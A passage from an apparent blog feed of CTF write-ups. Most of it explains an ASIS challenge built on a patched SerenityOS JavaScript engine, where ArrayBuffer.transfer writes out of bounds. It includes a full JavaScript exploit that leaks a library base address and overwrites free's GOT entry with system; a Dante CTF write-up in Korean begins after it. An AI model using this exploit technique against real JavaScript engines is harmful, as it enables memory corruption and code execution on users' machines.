</span><br><span class="line">     // 11. Let fromBlock be arrayBuffer.[[ArrayBufferData]].</span><br><span class="line">     // 12. Let toBlock be newBuffer.[[ArrayBufferData]].</span><br><span class="line"><span class="comment">diff --git a/./Userland/Utilities/js.cpp b/../patched-serenity/Userland/Utilities/js.cpp</span></span><br><span class="line"><span class="comment">index 78fe2e699c..1dace537ab 100644</span></span><br><span class="line"><span class="comment">--- a/./Userland/Utilities/js.cpp</span></span><br><span class="line"><span class="comment">+++ b/../patched-serenity/Userland/Utilities/js.cpp</span></span><br><span class="line"><span class="meta">@@ -343,34 +343,34 @@</span> void ReplObject::initialize(JS::Realm&amp; realm)</span><br><span class="line"> &#123;</span><br><span class="line">     Base::initialize(realm);</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="deletion">-    u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;exit&quot;, exit_interpreter, 0, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;help&quot;, repl_help, 0, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;save&quot;, save_to_file, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-    define_native_accessor(</span></span><br><span class="line"><span class="deletion">-        realm,</span></span><br><span class="line"><span class="deletion">-        &quot;_&quot;,</span></span><br><span class="line"><span class="deletion">-        [](JS::VM&amp;) &#123;</span></span><br><span class="line"><span class="deletion">-            return g_last_value.value();</span></span><br><span class="line"><span class="deletion">-        &#125;,</span></span><br><span class="line"><span class="deletion">-        [](JS::VM&amp; vm) -&gt; JS::ThrowCompletionOr&lt;JS::Value&gt; &#123;</span></span><br><span class="line"><span class="deletion">-            auto&amp; global_object = vm.get_global_object();</span></span><br><span class="line"><span class="deletion">-            VERIFY(is&lt;ReplObject&gt;(global_object));</span></span><br><span class="line"><span class="deletion">-            outln(&quot;Disable writing last value to &#x27;_&#x27;&quot;);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-            // We must delete first otherwise this setter gets called recursively.</span></span><br><span class="line"><span class="deletion">-            TRY(global_object.internal_delete(JS::PropertyKey &#123; &quot;_&quot; &#125;));</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-            auto value = vm.argument(0);</span></span><br><span class="line"><span class="deletion">-            TRY(global_object.internal_set(JS::PropertyKey &#123; &quot;_&quot; &#125;, value, &amp;global_object));</span></span><br><span class="line"><span class="deletion">-            return value;</span></span><br><span class="line"><span class="deletion">-        &#125;,</span></span><br><span class="line"><span class="deletion">-        attr);</span></span><br><span class="line"><span class="addition">+    // define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="addition">+    // u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;exit&quot;, exit_interpreter, 0, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;help&quot;, repl_help, 0, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;save&quot;, save_to_file, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    // define_native_accessor(</span></span><br><span class="line"><span class="addition">+    //     realm,</span></span><br><span class="line"><span class="addition">+    //     &quot;_&quot;,</span></span><br><span class="line"><span class="addition">+    //     [](JS::VM&amp;) &#123;</span></span><br><span class="line"><span class="addition">+    //         return g_last_value.value();</span></span><br><span class="line"><span class="addition">+    //     &#125;,</span></span><br><span class="line"><span class="addition">+    //     [](JS::VM&amp; vm) -&gt; JS::ThrowCompletionOr&lt;JS::Value&gt; &#123;</span></span><br><span class="line"><span class="addition">+    //         auto&amp; global_object = vm.get_global_object();</span></span><br><span class="line"><span class="addition">+    //         VERIFY(is&lt;ReplObject&gt;(global_object));</span></span><br><span class="line"><span class="addition">+    //         outln(&quot;Disable writing last value to &#x27;_&#x27;&quot;);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    //         // We must delete first otherwise this setter gets called recursively.</span></span><br><span class="line"><span class="addition">+    //         TRY(global_object.internal_delete(JS::PropertyKey &#123; &quot;_&quot; &#125;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    //         auto value = vm.argument(0);</span></span><br><span class="line"><span class="addition">+    //         TRY(global_object.internal_set(JS::PropertyKey &#123; &quot;_&quot; &#125;, value, &amp;global_object));</span></span><br><span class="line"><span class="addition">+    //         return value;</span></span><br><span class="line"><span class="addition">+    //     &#125;,</span></span><br><span class="line"><span class="addition">+    //     attr);</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> JS_DEFINE_NATIVE_FUNCTION(ReplObject::save_to_file)</span><br><span class="line"><span class="meta">@@ -429,11 +429,11 @@</span> void ScriptObject::initialize(JS::Realm&amp; realm)</span><br><span class="line"> &#123;</span><br><span class="line">     Base::initialize(realm);</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="deletion">-    u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="addition">+    // u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> JS_DEFINE_NATIVE_FUNCTION(ScriptObject::load_ini)</span><br></pre></td></tr></table></figure><p>I got errors when I applied it to my source using <code>git apply</code>. So I modified source codes myself.<br>By the way, when I checked it I knew this challenge is from <code>serenity</code>. </p><ul><li><a href="https://github.com/SerenityOS/serenity/tree/master">https://github.com/SerenityOS/serenity/tree/master</a></li></ul><h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>The important part is <code>array_buffer_copy_and_detach</code> function in <code>ArrayBuffer.cpp</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 25.1.2.14 ArrayBufferCopyAndDetach ( arrayBuffer, newLength, preserveResizability ), https://tc39.es/proposal-arraybuffer-transfer/#sec-arraybuffer.prototype.transfertofixedlength</span></span><br><span class="line">ThrowCompletionOr&lt;ArrayBuffer*&gt; <span class="title function_">array_buffer_copy_and_detach</span><span class="params">(VM&amp; vm, ArrayBuffer&amp; array_buffer, Value new_length, PreserveResizability)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span>&amp; realm = *vm.current_realm();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. Perform ? RequireInternalSlot(arrayBuffer, [[ArrayBufferData]]).</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> 2. If IsSharedArrayBuffer(arrayBuffer) is true, throw a TypeError exception.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. If newLength is undefined, then</span></span><br><span class="line">    <span class="comment">// a. Let newByteLength be arrayBuffer.[[ArrayBufferByteLength]].</span></span><br><span class="line">    <span class="comment">// 4. Else,</span></span><br><span class="line">    <span class="comment">// a. Let newByteLength be ? ToIndex(newLength).</span></span><br><span class="line">    <span class="keyword">auto</span> new_byte_length = new_length.is_undefined() ? array_buffer.byte_length() : TRY(new_length.to_index(vm));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. If IsDetachedBuffer(arrayBuffer) is true, throw a TypeError exception.</span></span><br><span class="line">    <span class="keyword">if</span> (array_buffer.is_detached())</span><br><span class="line">        <span class="keyword">return</span> vm.throw_completion&lt;TypeError&gt;(ErrorType::DetachedArrayBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> 6. If preserveResizability is preserve-resizability and IsResizableArrayBuffer(arrayBuffer) is true, then</span></span><br><span class="line">    <span class="comment">// a. Let newMaxByteLength be arrayBuffer.[[ArrayBufferMaxByteLength]].</span></span><br><span class="line">    <span class="comment">// 7. Else,</span></span><br><span class="line">    <span class="comment">// a. Let newMaxByteLength be empty.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. If arrayBuffer.[[ArrayBufferDetachKey]] is not undefined, throw a TypeError exception.</span></span><br><span class="line">    <span class="keyword">if</span> (!array_buffer.detach_key().is_undefined())</span><br><span class="line">        <span class="keyword">return</span> vm.throw_completion&lt;TypeError&gt;(ErrorType::DetachKeyMismatch, array_buffer.detach_key(), js_undefined());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9. Let newBuffer be ? AllocateArrayBuffer(%ArrayBuffer%, newByteLength, <span class="doctag">FIXME:</span> newMaxByteLength).</span></span><br><span class="line">    <span class="keyword">auto</span>* new_buffer = TRY(allocate_array_buffer(vm, realm.intrinsics().array_buffer_constructor(), new_byte_length));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 10. Let copyLength be min(newByteLength, arrayBuffer.[[ArrayBufferByteLength]]).</span></span><br><span class="line">    <span class="keyword">auto</span> copy_length = min(new_byte_length, array_buffer.byte_length());</span><br><span class="line">    <span class="keyword">if</span>(array_buffer.byte_length() &gt; <span class="number">0x100</span>) &#123;</span><br><span class="line">        copy_length = array_buffer.byte_length();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 11. Let fromBlock be arrayBuffer.[[ArrayBufferData]].</span></span><br><span class="line">    <span class="comment">// 12. Let toBlock be newBuffer.[[ArrayBufferData]].</span></span><br><span class="line">    <span class="comment">// 13. Perform CopyDataBlockBytes(toBlock, 0, fromBlock, 0, copyLength).</span></span><br><span class="line">    <span class="comment">// 14. <span class="doctag">NOTE:</span> Neither creation of the new Data Block nor copying from the old Data Block are observable. Implementations may implement this method as a zero-copy move or a realloc.</span></span><br><span class="line">    copy_data_block_bytes(new_buffer-&gt;buffer(), <span class="number">0</span>, array_buffer.buffer(), <span class="number">0</span>, copy_length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 15. Perform ! DetachArrayBuffer(arrayBuffer).</span></span><br><span class="line">    TRY(detach_array_buffer(vm, array_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 16. Return newBuffer.</span></span><br><span class="line">    <span class="keyword">return</span> new_buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I wanted to trigger this function, But I didnâ€™t know how to trigger it. So I read mozillaâ€™s document. The reason I read this part was simply because this function was related to arraybuffer. (guessing with file name ^^)</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ArrayBuffer.prototype.transfer() Experimental</span><br><span class="line">Creates a new ArrayBuffer with the same byte content as this buffer, then detaches this buffer.</span><br></pre></td></tr></table></figure><p>I realized I could use <code>transfer</code>. I was able to trigger it using the script below.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer)</span><br><span class="line">buffer.<span class="title function_">transfer</span>(<span class="number">0x8</span>);</span><br></pre></td></tr></table></figure><p>The important point in this function is how define <code>copy_length</code>. When size of old buffer(<code>arrray_buffer</code>) is over 0x100, size of <code>new_buffer</code> is same as old buffer. It is really important that <code>copy_length</code> is newly redefined because the argument of <code>transfer</code> is passed to malloc as a size, which creates a new buffer. </p><p>In the JavaScript above is original <code>copy_length</code> is 0x20, but size of <code>array_buffer</code> is over 0x100, so it is redefined as 0x120!</p><p>Now letâ€™s analyze the function below. (<code>copy_data_block_bytes</code>) </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6.2.9.3 CopyDataBlockBytes ( toBlock, toIndex, fromBlock, fromIndex, count ), https://tc39.es/ecma262/#sec-copydatablockbytes</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_data_block_bytes</span><span class="params">(ByteBuffer&amp; to_block, u64 to_index, ByteBuffer <span class="type">const</span>&amp; from_block, u64 from_index, u64 count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1. Assert: fromBlock and toBlock are distinct values.</span></span><br><span class="line">    VERIFY(&amp;to_block != &amp;from_block);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. Let fromSize be the number of bytes in fromBlock.</span></span><br><span class="line">    <span class="keyword">auto</span> from_size = from_block.size();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. Assert: fromIndex + count â‰¤ fromSize.</span></span><br><span class="line">    VERIFY(from_index + count &lt;= from_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. Let toSize be the number of bytes in toBlock.</span></span><br><span class="line">    <span class="comment">// auto to_size = to_block.size();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. Assert: toIndex + count â‰¤ toSize.</span></span><br><span class="line">    <span class="comment">// VERIFY(to_index + count &lt;= to_size);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. Repeat, while count &gt; 0,</span></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// ..</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ii. Set toBlock[toIndex] to fromBlock[fromIndex].</span></span><br><span class="line">        to_block[to_index] = from_block[from_index]; <span class="comment">// here!!!</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// c. Set toIndex to toIndex + 1.</span></span><br><span class="line">        ++to_index;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// d. Set fromIndex to fromIndex + 1.</span></span><br><span class="line">        ++from_index;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// e. Set count to count - 1.</span></span><br><span class="line">        --count;</span><br><span class="line">        <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. Return unused.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There is no <code>to_index + count &lt;= to_size</code> check. So I can trigger overflow in this line.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ii. Set toBlock[toIndex] to fromBlock[fromIndex].</span></span><br><span class="line">to_block[to_index] = from_block[from_index]; <span class="comment">// here!!!</span></span><br></pre></td></tr></table></figure><p>It was natural, since length(size) of <code>to_block</code> is smaller than <code>count</code>. </p><p>This is the end of the vulnerabilities I analyzed. Now Letâ€™s go exploit. ^^</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li><p>libc leak</p><ul><li>I leaked address of <code>liblagom-js.so.0</code>.</li><li>During this process, I conducted various experiments. </li><li>I knew the return value of <code>transfer</code> can made type array. So I tried it and then I can did it. (Actually I think I was lucky. ^^)</li><li>However, in this process, it was necessary to set values such as view[4], view[5], and view[6]. I relied on dynamic analysis(gdb). </li><li><code>view[4]</code>: it means size of victim. when this had too low value, I canâ€™t made type array.</li><li><code>view[5]</code>: whether it is an inline buffer. (I didnâ€™t know what this meant when I solved.)</li><li><code>view[6]</code>: whether it is detached.</li></ul></li><li><p>GOT overwriting</p><ul><li>I checked the mapping memory(vmmap instruction in gef debugger) to see if this was possible or not.</li><li>When I called <code>transer</code>, I checked the <code>free</code> is called. To be exact, it is called when the old buffer is detached. (<code>detach_array_buffer</code>)</li><li>So I decided to overwrite freeâ€™s got with a system function!</li><li>Actually, I had concerns about how to give an argument to the system.</li><li>The answer was to write to an Array Buffer.</li><li>In this challenge, I need to execute <code>/readflag</code> instead of <code>sh</code> to read flag.</li></ul></li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`-<span class="subst">$&#123;hex(-x)&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`0x<span class="subst">$&#123;x.toString(<span class="number">16</span>)&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line">    view = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer);</span><br><span class="line">     </span><br><span class="line">    view[<span class="number">4</span>] = <span class="number">0x500n</span>; <span class="comment">// size</span></span><br><span class="line">    view[<span class="number">5</span>] = <span class="number">1n</span>;     <span class="comment">// from_block = (__int64 *)*a3;</span></span><br><span class="line">    view[<span class="number">6</span>] = <span class="number">1n</span>;     <span class="comment">// is_detached</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> buffer2 = buffer.<span class="title function_">transfer</span>(<span class="number">0x20</span>); </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(buffer2.<span class="property">byteLength</span>);</span><br><span class="line">    <span class="keyword">var</span> victim = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer2);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        leak</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    liblagom_js_base = victim[<span class="number">8</span>] - <span class="number">0x67dda8n</span>; <span class="comment">// liblagom-js.so.0</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;liblagom_js_base: &quot;</span> + <span class="title function_">hex</span>(liblagom_js_base));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Exploit setup</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line">    hax = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line">    free_got = liblagom_js_base + <span class="number">0x69b420n</span>;</span><br><span class="line">    system = liblagom_js_base - <span class="number">0x5c4dd0n</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;free_got: &quot;</span>+ <span class="title function_">hex</span>(free_got));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;system: &quot;</span>+ <span class="title function_">hex</span>(system));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line">    v = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(b);</span><br><span class="line">    </span><br><span class="line">    v[<span class="number">0</span>] = <span class="number">0x616c66646165722fn</span>; </span><br><span class="line">    v[<span class="number">1</span>] = <span class="number">0x0000000000000067n</span>;</span><br><span class="line">    </span><br><span class="line">    v[<span class="number">4</span>] = <span class="number">0x500n</span>; <span class="comment">// size</span></span><br><span class="line">    v[<span class="number">5</span>] = <span class="number">1n</span>;     <span class="comment">// from_block = (__int64 *)*a3;</span></span><br><span class="line">    v[<span class="number">6</span>] = <span class="number">1n</span>;     <span class="comment">// is_detached</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// got overwriting</span></span><br><span class="line">    victim[<span class="number">64</span>] = free_got; </span><br><span class="line">    hax[<span class="number">0</span>] = system;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Exploit</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    b.<span class="title function_">transfer</span>(<span class="number">0x20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">pwn</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> ASIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> javascript-engine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dante CTF 2023 - Dantes Notebook (overflow)</title>
      <link href="/230609-dantectf2023-dantes_notebook/"/>
      <url>/230609-dantectf2023-dantes_notebook/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2000">https://ctftime.org/event/2000</a></li></ul><blockquote><p>During his trip to Hell Dante met many souls. He took notes about them in this diary.<br>Author: lillo<br>Medium<br><code>challs.dantectf.it:31530/tcp</code></p></blockquote><ul><li>[29 solves &#x2F; 435 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>heap ë¬¸ì œì¸ ì¤„ ì•Œì•˜ìœ¼ë‚˜ ì•„ë‹ˆì—ˆë‹¤. ë¶„ì„í•œ ê²°ê³¼, ê°„ë‹¨í•œ fsbê°€ í„°ì§€ê³ , overflowë‚˜ëŠ” ê³³ì´ ë‘ ê³³ ìžˆë‹¤. í•˜ì§€ë§Œ í•œ ê³³ë§Œ íë¦„ì„ ì¡°ìž‘ ê°€ëŠ¥í•˜ë‹¤. overflowë¡œ íë¦„ì„ ì¡°ìž‘í•  ë•Œ, canaryê°€ ì¡´ìž¬í•˜ê¸° ë•Œë¬¸ì— fsbë¡œ canaryë¥¼ leakí•˜ê¸°ë¡œ í–ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Souls</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="type">char</span> date[<span class="number">11</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_soul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Souls</span> *<span class="title">dest</span>;</span> <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span 